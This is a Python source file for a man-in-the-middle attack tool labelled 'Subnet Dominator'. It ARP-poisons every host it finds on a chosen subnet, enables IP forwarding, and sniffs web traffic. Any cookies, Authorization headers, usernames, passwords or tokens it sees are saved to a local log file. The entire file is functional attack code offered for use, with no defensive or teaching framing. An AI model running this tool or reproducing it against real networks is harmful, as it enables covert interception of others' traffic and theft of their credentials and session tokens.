import os
import time
import threading
import sys
import logging
import questionary
from scapy.all import ARP, sendp, Ether, srp, IP, TCP, Raw, conf, get_if_list, sniff
from rich.console import Console
from rich.table import Table
from core.ui import draw_header, Q_STYLE

# Suppress Scapy IPv6 warning and set logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
console = Console()


class MITMEngine:
    def __init__(self):
        self.stop_event = threading.Event()
        self.interface = ""
        self.gateway_ip = ""
        self.targets = []  # List of (IP, MAC) tuples
        self.threads = []

    def check_privileges(self):
        """Ensures the script is running with root/admin privileges."""
        if os.getuid() != 0:
            console.print(
                "[bold red][!] Error: This script must be run as root (sudo).[/bold red]")
            sys.exit(1)

    def toggle_forwarding(self, state=True):
        """Enables IP forwarding across macOS and Linux with error handling."""
        val = 1 if state else 0
        try:
            if sys.platform == 'darwin':
                os.system(
                    f"sudo sysctl -w net.inet.ip.forwarding={val} > /dev/null")
            elif sys.platform.startswith('linux'):
                os.system(
                    f"echo {val} | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
            console.print(
                f"[*] IP Forwarding {'enabled' if state else 'disabled'}.")
        except Exception as e:
            console.print(
                f"[yellow][!] Forwarding config failed: {e}[/yellow]")

    def get_mac(self, ip):
        """Resolves MAC address with high-retry logic and ARP requests."""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                         timeout=3, retry=3, verbose=False, iface=self.interface)
            if ans:
                return ans[0][1].hwsrc
            return None
        except Exception as e:
            console.print(f"[red][!] Error resolving MAC for {ip}: {e}[/red]")
            return None

    def packet_callback(self, packet):
        """Live Session Intelligence: Extracts sensitive data from plaintext streams."""
        if packet.haslayer(Raw) and packet.haslayer(IP):
            try:
                load = packet[Raw].load.decode('utf-8', errors='ignore')
                # Detect Session Identifiers and common credentials
                keywords = ["Cookie:", "Authorization:",
                            "user=", "pass=", "token="]
                if any(key in load for key in keywords):
                    src_ip = packet[IP].src
                    dst_ip = packet[IP].dst
                    console.print(
                        f"[bold red][!] INTEL INTERCEPTED ({src_ip} -> {dst_ip}):[/bold red] Potential Sensitive Data")

                    if not os.path.exists("logs"):
                        os.makedirs("logs")
                    with open("logs/session_tokens.txt", "a") as f:
                        f.write(
                            f"--- {time.ctime()} ---\nSource: {src_ip}\nPayload: {load}\n\n")
            except Exception:
                pass

    def poison(self, target_ip, target_mac, gateway_mac):
        """Asynchronous poisoning loop for a target."""
        # Packet to tell target we are the router
        target_pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
                                               hwdst=target_mac, psrc=self.gateway_ip)
        # Packet to tell router we are the target
        router_pkt = Ether(dst=gateway_mac)/ARP(op=2,
                                                pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip)

        while not self.stop_event.is_set():
            try:
                sendp(target_pkt, verbose=False, iface=self.interface)
                sendp(router_pkt, verbose=False, iface=self.interface)
                time.sleep(2)
            except Exception:
                break

    def restore(self, target_ip, target_mac, gateway_mac):
        """Restores ARP tables to original state using the correct MACs."""
        console.print(f"[*] Restoring network for {target_ip}...")
        res_target = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
                                               hwdst=target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac)
        res_router = Ether(dst=gateway_mac)/ARP(op=2, pdst=self.gateway_ip,
                                                hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
        for _ in range(7):  # Multiple sends to ensure the update is received
            sendp(res_target, verbose=False, iface=self.interface)
            sendp(res_router, verbose=False, iface=self.interface)
            time.sleep(0.2)

    def run(self):
        self.check_privileges()
        draw_header("MITM Engine: Subnet Dominator")

        # Interface Discovery
        ifaces = get_if_list()

        self.interface = questionary.select(
            "Select Interface:",
            choices=ifaces,
            style=Q_STYLE
        ).ask()

        if not self.interface:
            return

        self.gateway_ip = questionary.text(
            "Gateway (Router) IP:", style=Q_STYLE).ask()
        target_input = questionary.text(
            "Target IP or Range (e.g. 192.168.1.5):", style=Q_STYLE).ask()

        gw_mac = self.get_mac(self.gateway_ip)
        if not gw_mac:
            return console.print("[red]Could not resolve Gateway MAC. Check connection.[/red]")
        console.print(f"[green][+] Resolved Gateway MAC: {gw_mac}[/green]")

        # Subnet Resolution
        console.print("[*] Mapping subnet targets...")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_input),
                     timeout=2, verbose=False, iface=self.interface)

        for _, rcv in ans:
            if rcv.psrc != self.gateway_ip:
                self.targets.append((rcv.psrc, rcv.hwsrc))

        if not self.targets:
            return console.print("[red]No active targets found on the specified range.[/red]")

        # Start Poisoning
        self.toggle_forwarding(True)
        console.print(
            f"[bold green][+] Poisoning {len(self.targets)} targets...[/bold green]")

        for ip, mac in self.targets:
            t = threading.Thread(target=self.poison, args=(
                ip, mac, gw_mac), daemon=True)
            t.start()
            self.threads.append(t)

        console.print(
            "[bold red][!] Interception Active. Press Ctrl+C to stop and restore network.[/bold red]")

        try:
            # Sniff only HTTP/Plaintext traffic to maximize performance
            sniff(iface=self.interface, prn=self.packet_callback,
                  store=0, filter="tcp port 80 or tcp port 8080 or tcp port 443")
        except KeyboardInterrupt:
            console.print("\n[yellow][!] Shutdown signal received...[/yellow]")
        finally:
            self.stop_event.set()
            for ip, mac in self.targets:
                self.restore(ip, mac, gw_mac)
            self.toggle_forwarding(False)
            console.print(
                "[bold green][+] Network Restored Successfully.[/bold green]")


def start_mitm():
    try:
        engine = MITMEngine()
        engine.run()
    except Exception as e:
        console.print(f"[red][!] Fatal Error: {e}[/red]")


if __name__ == "__main__":
    start_mitm()
